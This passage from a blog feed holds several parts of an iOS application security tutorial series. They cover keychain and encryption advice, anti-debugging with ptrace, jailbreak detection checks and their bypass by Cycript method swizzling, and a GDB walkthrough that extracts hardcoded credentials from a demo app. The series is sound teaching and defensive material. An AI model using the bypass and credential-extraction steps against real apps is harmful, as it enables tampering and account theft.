&lt;pre&gt;PDKeychainBindings *bindings = [PDKeychainBindings sharedKeychainBindings];
[[[Model sharedModel] currentUser] setAuthToken:[bindings objectForKey:@&quot;authToken&quot;]];
&lt;/pre&gt;

&lt;p&gt;However, please note that on a jailbroken device, keychain information is not secure. It is also advisable to use your own encryption methods to encrypt the string that needs to be protected and then save on the keychain. This adds an extra layer of security because even though the attacker can get the encrypted string from the keychain, he will still have to decrypt this encrypted string.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;NSUserDefaults should never be used to store confidential information like passwords, authentication tokens etc. This is because all the information saved by NSUserDefaults is present in an unencrypted format in a plist file that can be found in the location &lt;em&gt;Library -&amp;gt; Preferences -&amp;gt; $AppBundleId.plist&lt;/em&gt; inside your application bundle. Any one can use a tool iExplorer to get a peek inside the application bundle and get the plist file even if the device is not jailbroken.&lt;/li&gt;
  &lt;li&gt;Plist files should also be never used to store confidential information like passwords etc because they can also be fetched very easily from inside the application bundle even on a non-jailbroken device. All the content inside a plist file is stored in unencrypted format.&lt;/li&gt;
  &lt;li&gt;Core Data files are also stored as unencrypted database files in your application bundle.The Core Data framework internally uses Sql queries to store its data and hence all the files are stored as .db files. One can easily copy these files to their computer and use a tool like sqlite3 to examine all the content in these database files.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;transport-layer-security&quot;&gt;Transport Layer Security&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Do not allow self signed certificates to be used when releasing the application. Most developers allows self signed certificates in debug mode but the same shouldn’t be done when releasing the application.&lt;/li&gt;
  &lt;li&gt;Do not use a parameter unique to the device (MAC address, IP, UDID) to determine things like the Session ID, authentication token etc.&lt;/li&gt;
  &lt;li&gt;Important decisions like Authentication and Authorization should be taken on the backend. Remember that a hacker has the ability to manipulate the runtime of your application.&lt;/li&gt;
  &lt;li&gt;Proper input validation should occur both on the client side as well as the server side. A malicious hacker can always modify the request using Burpsuite. It is important to validate the parameters being sent to the backend to avoid any kind of injection attacks.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;use-encryption&quot;&gt;Use Encryption&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Encrypt important files before saving them locally. Again, you don’t have to be an Cryptography guru to encrypt those files. There are a lot of third party libraries that can get the job done for you. I have written an &lt;a href=&quot;http://highaltitudehacks.com/2013/09/26/ios-dev-encrypted-images-and-saving-them-in-app-sandbox&quot;&gt;article&lt;/a&gt; on &lt;em&gt;Encrypting images and saving them in App Sandbox&lt;/em&gt; that uses the &lt;a href=&quot;https://github.com/rnapier/RNCryptor&quot;&gt;RNCryptor&lt;/a&gt; library available on Github. The same technique can be used to encrypt any kind of file. Here is a snippet that shows how easy it is to encrypt a file.
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UIImage *imageToEncrypt = [UIImage imageNamed:@&quot;SomeImage&quot;]; NSString *imagePath = [NSHomeDirectory() stringByAppendingPathComponent:@&quot;Documents/encryptedImage.png&quot;]; NSData *data = UIImagePNGRepresentation(fetchedImage); NSError *error; NSData *encryptedData = [RNEncryptor encryptData:data withSettings:kRNCryptorAES256Settings password:@&quot;ABC123&quot; error:&amp;amp;error]; [encryptedData writeToFile:imagePath atomically:YES];&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;To encrypt SQlite files, you should also consider using &lt;a href=&quot;http://sqlcipher.net/&quot;&gt;SQLCipher&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;add-checks-to-prevent-runtime-analysis&quot;&gt;Add checks to prevent Runtime Analysis&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Remember that with a copy of your application binary, a hacker is in complete control. It is therefore important to make his job as difficult as possible. One of the ways to do that is to block debuggers to attach to the application. We have already learnt how to do that in &lt;a href=&quot;http://resources.infosecinstitute.com/ios-application-security-part-23-defending-runtime-analysis-manipulation/&quot;&gt;Part 23&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios25/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This will block debuggers from attaching to this application. We have already learnt how we were able to trace calls using &lt;a href=&quot;http://highaltitudehacks.com/2013/08/20/ios-application-security-part-9-analyzing-security-of-ios-applications-using-snoop-it&quot;&gt;Snoop-it&lt;/a&gt;. Here is a screenshot from the same article.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios25/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;With the line of code added above in main.m file, we wouldn’t be able to do this now. This is because Snoop-it traces calls by attaching a debugger to the application when it starts, and now with the above check, it won’t be able to do that and the application will crash. Please note that this will not prevent the application from tools like Cycript because they do not trace the application.&lt;/p&gt;

&lt;h3 id=&quot;some-other-minor-things&quot;&gt;Some other minor things&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;TextFields that have inputs as passwords should be used with &lt;em&gt;Secure&lt;/em&gt; option. This is because iOS usually caches all the things that you enter in textfields, provided it doesn’t have the &lt;em&gt;Secure&lt;/em&gt; tag. Also disable &lt;em&gt;AutoCorrection&lt;/em&gt; for those text fields. In the image below, you can see that the textfield has &lt;em&gt;AutoCorrection&lt;/em&gt; set to NO and the &lt;em&gt;Secure&lt;/em&gt; tag is being enabled.
&lt;img src=&quot;/images/posts/ios25/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Clear the Pasteboard once the application enters background. You can do this by adding the following line in the method &lt;em&gt;- (void)applicationDidEnterBackground:(UIApplication *)application&lt;/em&gt; in AppDelegate. Ify you are using a custom Pasteboard, replace &lt;em&gt;[UIPasteboard generalPasteboard]&lt;/em&gt; with your custom pasteboard.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;	- (void)applicationDidEnterBackground:(UIApplication *)application
	{
	    // Use this method to release shared resources, save user data, invalidate timers, and store enough application state information to restore your application to its current state in case it is terminated later. 
	    // If your application supports background execution, this method is called instead of applicationWillTerminate: when the user quits.
	    [UIPasteboard generalPasteboard].items = nil;
	}

&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Add a prompt or validate input before doing anything critical using URL schemes. We know that any application can register for a URL scheme. For e.g, the Skype app can register for the URL scheme skype:// and any application can call this url with a particular parameter. This allows for a little bit of communication between applications. Previously, there was a vulnerability in Skype where any user can make a call to anyone by using the following url.&lt;/p&gt;

    &lt;pre&gt;	skype://123123123?call
&lt;/pre&gt;

    &lt;p&gt;Since the skype app didn’t prompt the user before making the call, the calls were directly sent. It would have been better to prompt the user befor actually making the call. The input to the URL scheme should also be validated. You can add validation in the method &lt;em&gt;- (BOOL)application:(UIApplication *)application handleOpenURL:(NSURL *)url&lt;/em&gt; in AppDelegate&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;	- (BOOL)application:(UIApplication *)application handleOpenURL:(NSURL *)url {
	    //Validate input from the url
	    return YES;
	}
&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;Some applications use UIWebViews that can be used to display content from a URL. There have been &lt;a href=&quot;https://www.google.co.in/url?sa=t&amp;amp;rct=j&amp;amp;q=&amp;amp;esrc=s&amp;amp;source=web&amp;amp;cd=2&amp;amp;cad=rja&amp;amp;ved=0CEcQFjAB&amp;amp;url=https%3A%2F%2Fsuperevr.com%2Fblog%2F2011%2Fxss-in-skype-for-ios%2F&amp;amp;ei=nfCOUpLNHsq8rAfUwoGQCg&amp;amp;usg=AFQjCNGLyriyo0tNWE9nfO4vdxWHb7KoFw&amp;amp;sig2=gNsCv0PGojvQGfW6YojWVQ&amp;amp;bvm=bv.57084495,d.bmk&quot;&gt;vulnerabilities&lt;/a&gt; discovered previously in UIWebviews in popular applications.UIWebviews also support javascript and currently there is no public API available to disable javascript in a UIWebview. Therefore if any user controlled input is used to populate content in a UIWebview, it can be manipulated during runtime to execute javascript code on the UIWebview. Even if the input is not user controlled, the attacker can manipulate the content being added to the UIWebview druring runtime and hence execute any javascript code he wants. Since there is not much a developer can do about it due to the restrictions imposed by Apple, a developer should make sure that the content he loads into the UIWebview is not malicious by a) Making sure the data is loaded over HTTPs b) Making sure the content in the UIWebview does not depend on user input and c) validate the contents of the URL by using the function &lt;em&gt;dataWithContentsOfURL&lt;/em&gt; present in the NSData class.&lt;/li&gt;
&lt;/ul&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 24 – Jailbreak Detection and Evasion</title>
   <link href="https://bitbrain.github.io/2013/12/17/ios-application-security-part-24-jailbreak-detection-and-evasion.html"/>
   <updated>2013-12-17T12:33:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/12/17/ios-application-security-part-24-jailbreak-detection-and-evasion</id>
   <content type="html">&lt;p&gt;In this article, we will look at the checks a developer can incorporate in his application to check whether the device on which the application is running is jailbroken or not. Checking whether a device is jailbroken or not can have many advantages for your application. As we have already seen, an attacker can run tools like Cycript, GDB, Snoop-it etc to perform runtime analysis and steal sensitive data from within your application. If you are really looking to add an extra layer of security for your application, you should not allow your application to be run on a jailbroken device. Please note that millions of users jailbreak their devices and hence not allowing an application to be run on a jailbroken device could have a significant impact on your user base. Another thing you can do is instead block some of the features in your application rather than disabing it entirely. We will also look at how hackers can bypass the check for jailbreak detection in your application using Cycript.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;Once a device is jailbroken, a lot of other files and applications are installed on the devcice. Checking for these files in the filesystem can help us identify whether the device is jailbroken or not. For e.g, most of the jailbreak softwares install Cydia on the device after jailbreaking. Hence just a simple check for the file path of Cydia can determine whether the device is jailbroken or not.&lt;/p&gt;

&lt;pre&gt;	NSString *filePath = @&quot;/Applications/Cydia.app&quot;;
	if ([[NSFileManager defaultManager] fileExistsAtPath:filePath])
	{
		//Device is jailbroken
	}
&lt;/pre&gt;

&lt;p&gt;However, not all devices that are jailbreaked have Cydia installed on them. In fact, most hackers can just change the location of the Cydia App. Checking for many other files related to Jailbroken devices can make this method much more efficient. For e.g, one can check if Mobile Substrate is installed on the device or not, which many applications require to run on a jailbroken device. One can also check for the location of the SSH Daemon, or the shell interpreter. Combining all these checks, we get a method like this.&lt;/p&gt;

&lt;pre&gt;	+(BOOL)isJailbroken{

	  if ([[NSFileManager defaultManager] fileExistsAtPath:@&quot;/Applications/Cydia.app&quot;]){
	      return YES;
	    }else if([[NSFileManager defaultManager] fileExistsAtPath:@&quot;/Library/MobileSubstrate/MobileSubstrate.dylib&quot;]){
	      return YES;
	    }else if([[NSFileManager defaultManager] fileExistsAtPath:@&quot;/bin/bash&quot;]){
	      return YES;
	    }else if([[NSFileManager defaultManager] fileExistsAtPath:@&quot;/usr/sbin/sshd&quot;]){
	      return YES;
	    }else if([[NSFileManager defaultManager] fileExistsAtPath:@&quot;/etc/apt&quot;]){
	      return YES;
	    }
	  return NO;
	}
&lt;/pre&gt;

&lt;p&gt;We have also learnt from the previous articles that applications that run as a mobile user run in a sandboxed environment and go inside the directory &lt;em&gt;/var/mobile/Applications&lt;/em&gt; whereas applications that run with the root user (e.g Apple’s preloaded applications) aren’t subject to any sandbox environment and go inside the directory &lt;em&gt;/Applications&lt;/em&gt;. A user running a jailbroken device can install your application in the /Applications folder thereby giving it root privileges. Hence, adding a check to see whether the application follows sandboxing rules can help the user identify whether the application is jailbroken or not. A good way to check for it would be to see if we can modify a file in some other location outside the application bundle.&lt;/p&gt;

&lt;pre&gt;    NSError *error;
   	NSString *stringToBeWritten = @&quot;This is a test.&quot;;
   	[stringToBeWritten writeToFile:@&quot;/private/jailbreak.txt&quot; atomically:YES
             encoding:NSUTF8StringEncoding error:&amp;amp;error];
   	if(error==nil){
       //Device is jailbroken
       return YES;
     } else {
       //Device is not jailbroken
       [[NSFileManager defaultManager] removeItemAtPath:@&quot;/private/jailbreak.txt&quot; error:nil];
     }

&lt;/pre&gt;

&lt;p&gt;We know that a skilled hacker can just modify the location of the application. However, we know that 80% or more of the devices that are jailbroken have Cydia installed on them, and even if the hacker can change the location of the Cydia app, he most probably won’t change the URL scheme with which the Cydia app is registered. If calling the Cydia’s URL scheme (cydia://) from your application gives a success, you can be sure that the device is jailbroken.&lt;/p&gt;

&lt;pre&gt;    if([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@&quot;cydia://package/com.example.package&quot;]]){
      //Device is jailbroken
    }
&lt;/pre&gt;

&lt;p&gt;Let’s also add a condition to make sure this code does not execute if we are testing our application on a simulator and not an actual device. After combining all the above techniques, our method looks like this.&lt;/p&gt;

&lt;pre&gt;
	+(BOOL)isJailbroken{

	#if !(TARGET_IPHONE_SIMULATOR)

	   if ([[NSFileManager defaultManager] fileExistsAtPath:@&quot;/Applications/Cydia.app&quot;]){
	      return YES;
	    }else if([[NSFileManager defaultManager] fileExistsAtPath:@&quot;/Library/MobileSubstrate/MobileSubstrate.dylib&quot;]){
	      return YES;
	    }else if([[NSFileManager defaultManager] fileExistsAtPath:@&quot;/bin/bash&quot;]){
	      return YES;
	    }else if([[NSFileManager defaultManager] fileExistsAtPath:@&quot;/usr/sbin/sshd&quot;]){
	      return YES;
	    }else if([[NSFileManager defaultManager] fileExistsAtPath:@&quot;/etc/apt&quot;]){
	      return YES;
	    }

	  NSError *error;
		NSString *stringToBeWritten = @&quot;This is a test.&quot;;
		[stringToBeWritten writeToFile:@&quot;/private/jailbreak.txt&quot; atomically:YES
	          encoding:NSUTF8StringEncoding error:&amp;amp;error];
		if(error==nil){
	    //Device is jailbroken
	    return YES;
	  } else {
	    [[NSFileManager defaultManager] removeItemAtPath:@&quot;/private/jailbreak.txt&quot; error:nil];
	  }

	  if([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@&quot;cydia://package/com.example.package&quot;]]){
	    //Device is jailbroken
	    return YES;
	  }
	#endif

	  //All checks have failed. Most probably, the device is not jailbroken
	  return NO;
	}
&lt;/pre&gt;

&lt;p&gt;Honestly speaking, there is no foolproof method of detecting jailbroken devices. A skilled hacker will always find a way to bypass these checks. He can simply find the instructions in the binary and replace all instructions with No-op. He can also swizzle your method implementation with his own using Cycript.&lt;/p&gt;

&lt;p&gt;He can first find the class information of the application using Class-dump-z. Over here, he can see a method named +(BOOL)isJailbroken in the JailbreakDetector class. Note that it is a class method as it begins with positive sign. It obviously means this method checks whether a device is jailbroken or not and returns YES if the device is jailbroken. If you are not getting any of this, you should consider reading &lt;a href=&quot;http://highaltitudehacks.com/security&quot;&gt;previous&lt;/a&gt; articles.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios24/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;He can then hook into this application using Cycript.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios24/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And then print out all the methods for the JailbreakDetector class. Please note that we are using JailbreakDetector-&amp;gt;isa.messages because isJailbroken is a class method. To find the instance methods, just using JailbreakDetector.messages would have worked for us.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios24/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And then he can swizzle the method implementation with his own that always returns a NO. If you are not getting this, i suggest that you read the article on &lt;a href=&quot;http://highaltitudehacks.com/2013/07/25/ios-application-security-part-8-method-swizzling-using-cycript&quot;&gt;Method Swizzling&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios24/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As a developer, what we can do is change the method name to something that doesn’t look quite appealing to the hacker. For e.g, the className JailbreakDetector could be renamed as ColorAdditions and the method +(BOOL)isJailbroken could be replaced by +(BOOL)didChangeColor with the implementation being the same. Something like this wouldn’t attract the attention of the hacker. He can always look at the calls that are being made inside this method using Snoop-it, GDB etc, but a small change like this can surely help in confusing him.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 23 – Defending against runtime analysis and manipulation</title>
   <link href="https://bitbrain.github.io/2013/12/17/ios-application-security-part-23-defending-against-runtime-analysis-and-manipulation.html"/>
   <updated>2013-12-17T10:37:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/12/17/ios-application-security-part-23-defending-against-runtime-analysis-and-manipulation</id>
   <content type="html">&lt;p&gt;In the &lt;a href=&quot;http://highaltitudehacks.com/security/&quot;&gt;previous&lt;/a&gt; articles, we have looked at how we can use debuggers and tools like Cycript to do runtime analysis and manipulation of iOS Applications. We have looked at how we can modify the actual implementation of a method during runtime by changing the values in the registers using GDB, and also looked at how we can completely &lt;a href=&quot;http://highaltitudehacks.com/2013/07/25/ios-application-security-part-8-method-swizzling-using-cycript&quot;&gt;swizzle&lt;/a&gt; method implementations using tools like Cycript. With tools like Cycript and GDB in his arsenal and with a copy of your application’s binary, the attacker is is complete control. However, there are certain techniques a developer can use to make the job of the hacker much more difficult. In this article, we will look at the techniques a developer can use in his application to defend it against runtime analysis and manipulation.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;In Xcode, there are certain checks that an attacker can use to determine whether an application is being debugged or not. In Xcode, use the following piece of code wherever you want to put a check for a debugger.&lt;/p&gt;

&lt;pre&gt;	#ifndef DEBUG
	    SEC_IS_BEING_DEBUGGED_RETURN_NIL();
	#endif
&lt;/pre&gt;

&lt;p&gt;As the name specifies, this macro returns &lt;em&gt;nil&lt;/em&gt; if the application is being debugged. You can put this check in important places in your application where you think important data is being accessed or returned in a function. If the application is being debugged at that moment, then this macro will return nil and hence your application wont function normally thereby causing problems for the attacker. Or you can simply call this macro with a timer and whenever you find that your application is being debugged, you delete all the important information stored in the app, remove all the important files etc. But please note that the attacker can just hijack your method implementation using Cycript, hence it is advisable to just use a macro instead of using this macro inside a method. Please note that this macro only works in release mode. To test it on your device, you will have to enable release mode on your build. To do that, select your scheme and click on &lt;em&gt;Edit Scheme&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios23/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then under Info, set the Build configuration to &lt;em&gt;Release&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios23/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, you can just run this application on your device using Xcode and you will see that the check for debugger will succeed. This is because Xcode attaches a debugger while running an application.&lt;/p&gt;

&lt;p&gt;Again, this does not guarantee that your application will not be debugged. A skilled attacker can just patch out all the assembly instructions for this macro from the application binary. As a developer, you should put this check in multiple places in the application to make the job difficult for the hacker.&lt;/p&gt;

&lt;p&gt;Another technique to prevent these debuggers from attaching to your application is by using the ptrace function. Using this function with a specific parameter, you can just deny any other debugger the ablity to attach to your application. The ptrace function is used by the debuggers like GDB and LLDB to attach to a process. Using the ptrace command with the parameter PT_DENY_ATTACH will tell the function to not allow this application to be traced. Here is a screenshot that tells about the PT_DENY_ATTACH parameter from &lt;a href=&quot;https://developer.apple.com/library/mac/documentation/Darwin/Reference/ManPages/man2/ptrace.2.html&quot;&gt;Apple’s documentation&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios23/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lets try this out. Create a new Project in Xcode. Click File-&amp;gt;New-&amp;gt;Project-&amp;gt;Single View Application. Then run it in the simulator. You will see an empty view this.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios23/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now go to the main.m file and modify it by adding the following code.&lt;/p&gt;

&lt;p&gt;Import the ptrace.h file and add the following code inside the main function.&lt;/p&gt;

&lt;pre&gt;#ifndef DEBUG
    ptrace(PT_DENY_ATTACH, 0, 0, 0);
#endif
&lt;/pre&gt;

&lt;p&gt;Your main.m file should look like this.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios23/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now run the application. You will see that the application fails to launch. This is because when Xcode launches this application, it tries to attach a debugger (LLDB or GDB) to the application. Because of the code that we just wrote in the main.m file, it is unable to do so and hence it quits the application.&lt;/p&gt;

&lt;p&gt;To make sure this is exactly what is happening, double tap the home button in the simulator and kill the Test application. Now launch it again. It will launch properly this time. This is because it was not launched via Xcode this time and hence a debugger wasn’t attached to it.&lt;/p&gt;

&lt;p&gt;Ofcourse, this method also doesn’t guarantee that your application will be secure. A skilled attacker can just patch this call out from your binary after decrypting it. As a developer, you should try and use this method in multiple places in the app which would further complicate the attacker’s job.&lt;/p&gt;

&lt;p&gt;It is important that even though both the techniques mentioned above will try and prevent debuggers from attaching to your application, it won’t protect from tools like Cycript which do not trace the application. As a developer, you can make the following checks in your application to make the hacker’s job as difficult as possible. For e.g, you can add false methods in your application, something that would get the attention of a hacker. For e.g a method with the name &lt;em&gt;userDidLogin:(BOOL)didLogin;&lt;/em&gt; will surely attrack the attacker’s attention. Ofcourse, he will try to execute it using Cycript. In this method’s implementation, you can clear all the important information in the app, and maybe even report to the server that this application is being breaked into. For banking apps that require special security, you can also check whether the device is jailbreaked or not. If it is, then deny all access to the server and remove all the important information stored locally in the app. We will look at how to check for a jailbroken device in the next article. Another thing you can do is check if your application is cracked or not and if it is, perform all the necessary steps to stop the attacker from gaining any further information from your application. There is a very simple class on &lt;a href=&quot;https://github.com/itruf/crackify&quot;&gt;github&lt;/a&gt; that can get the job done for you. Ofcourse, the attacker can always hijack this method’s implementation, so name it to something that doesn’t look suspicious.&lt;/p&gt;

&lt;p&gt;For methods that check for the security of the application, you can also change their names so they don’t look important. For e.g a method that checks whether the application is being debugged shouldn’t be named as &lt;em&gt;-(BOOL)isAppBeingDebugged&lt;/em&gt;. This is because it will definitely attract the attention of the attacker and he can just swap this method’s implementation. Instead, it would have been good to change this method’s name to something like &lt;em&gt;-(BOOL)didChangeColor&lt;/em&gt; or &lt;em&gt;-(BOOL)didSetFont&lt;/em&gt;. In this case, this function will look much less important to the attacker.&lt;/p&gt;

&lt;p&gt;If you have detected any suspicious activity and think that it would be best to just exit the application, you can do that with the following command.&lt;/p&gt;

&lt;pre&gt;exit(-1);&lt;/pre&gt;

&lt;p&gt;This will exit the application.&lt;/p&gt;

&lt;p&gt;Finally, it is very important to note that no application is secure in the hands of a skilled attacker. With a copy of your application’s binary and will tools like Cycript, GDB in their hands, a hacker is in complete control. What we can do as a developer is use as many checks as we can to prevent the application from being comprised so that the attacker can just give up and move on to some other application that is more easily exploitable.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 22 – Runtime Analysis and Manipulation using GDB</title>
   <link href="https://bitbrain.github.io/2013/12/17/ios-application-security-part-22-runtime-analysis-and-manipulation-using-gdb.html"/>
   <updated>2013-12-17T10:11:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/12/17/ios-application-security-part-22-runtime-analysis-and-manipulation-using-gdb</id>
   <content type="html">&lt;p&gt;In this article, we will look at how we can use GDB to perform runtime analysis of iOS applications. In the &lt;a href=&quot;http://highaltitudehacks.com/security/&quot;&gt;previous&lt;/a&gt; articles, we have looked at how we can use Cycript to analyze and manipulate the runtime behaviour of iOS applications. We have learnt how we can perform method &lt;a href=&quot;http://highaltitudehacks.com/2013/07/25/ios-application-security-part-8-method-swizzling-using-cycript&quot;&gt;swizzling&lt;/a&gt; and have our own methods being called instead of the original implementations. So why we do need GDB ? Well, what Cycript doesn’t allow us to do yet is set breakpoints and alter the values of variables and registers after a particular instruction. With GDB, we can dive deep into the application, observe the low level assembly instructions, manipulate the values in the registers and hence change the application flow completely.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;For this demo, you can download the sample application &lt;a href=&quot;https://github.com/prateek147/gdb-demo&quot;&gt;GDB-Demo&lt;/a&gt; from my github account. Then make sure to install and run it on the device. If you don’t have a registered developer account to run this on your device, you can follow the instruction mentioned &lt;a href=&quot;http://highaltitudehacks.com/2013/07/25/ios-application-security-part-7-installing-and-running-custom-applications-on-device-without-a-registered-developer-account&quot;&gt;here&lt;/a&gt;. I would also recommend that you have a look at the previous article on GDB in this series before going ahead with this one. This application is just a single view application that prompts for a username/password combination to log you in. It then validates the credentials entered locally and logs you in if the username/password combination is correct.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios22/device 1.PNG&quot; alt=&quot;Device 1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once the application is installed on your device, ssh into it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios22/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then start the GDB-Demo application on your device. In GDB, attach to the running process by using the command &lt;em&gt;attach GDB-Demo.PID&lt;/em&gt;. Here PID is the process ID of the GDB-Demo app. It can be different in your case. Just type &lt;em&gt;attach GDB-Demo&lt;/em&gt; and hit TAB. This will give you the correct process along with its PID appended to it. Once you hit enter, GDB will hook into the running process.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios22/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From the previous article, we already know about the class information about this app. We know it has a method named loginButtonTapped. So we set a breakpoint for it and press &lt;em&gt;c&lt;/em&gt; to continue the application.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios22/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, lets enter any username/password combination and press Login. This will trigger the breakpoint.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios22/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Use the &lt;em&gt;disas&lt;/em&gt; to print the disassembly for this function. Now we know that the validation is happening inside this function as we couldn’t see any other relevant method name from the class information of this application that would be of interest.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios22/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From the previous article, we also learnt that whenever an external method is called or a property is accessed, the objc_msgSend function is called. But there are thousands of objc_msgSend calls called in any application. We should only be concerned with the objc_msgSend calls related to this function. So we find out the addresses of all the instructions that call objc_msgSend and set a breakpoint for it. A very simple way to do it is to look for the blx instruction, note its address and set a breakpoint for it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios22/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Alright, i have set the breakpoint for some of the coming objc_msgSend calls in this function. Now we move through every objc_msgSend instruction one by one, print out the registers and see if there is anything of interest. We are printing out the value of r1 with every objc_msgSend call here. Then if there is nothing of interest, we just type &lt;em&gt;c&lt;/em&gt; to continue until the next breakpoint is hit.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios22/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ok, here is something of interest. If we look at the very bottom, we see that the method isEqualToString: gets called. Hence there is a comparison with a particular string. And from the knowledge gained in the previous articles we know that the r2 register will contain the argument to this function. Also, if you have some experience of writing Objective-C code, you will know that every object in Objective-C is a pointer. And this function isEqualToString: will also accept a string pointer as argment, which will be inside the r2 register. To find out the actual value of the object, GDB has a specific command &lt;em&gt;po&lt;/em&gt; that can print the value of the pointer contained in the register.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios22/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ok, so the string being compared is Admin. This looks like the username. Looks like half the job is done. Optionally, you could also have printed out the value of r2 in this way.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios22/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now a wise thing to do here would be enter the username as &lt;em&gt;Admin&lt;/em&gt; in the app again. This is because the flow may not reach a point where the password is being checked. So now lets enter the username as &lt;em&gt;Admin&lt;/em&gt; and enter anything as password. Now lets sets the breakpoints again and see if we can figure out the password as well. After some time doing the same process, we hit another breakpoint where the method isEqualToString: is being called. On printing the value of r2, we can see that the password is &lt;em&gt;HELLOiOSAPPLICATIONEXPERTS&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios22/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So now lets enter the username/password combination that we just found out and we can see that we will be authenticated.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios22/device 2.PNG&quot; alt=&quot;Device 2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Another way to achieve the same thing would have been to manipulate the values in the registers. In the disassembly code, we can see that there are 2 &lt;em&gt;cmp&lt;/em&gt; instructions.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios22/13.png&quot; alt=&quot;13&quot; /&gt; &lt;img src=&quot;/images/posts/ios22/14.png&quot; alt=&quot;14&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In both the cases, the value of the r0 register is checked against the value 0 and a decision is made after that. Lets set a breakpoint for both these instructions and continue the application.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios22/15.png&quot; alt=&quot;15&quot; /&gt;&lt;/p&gt;

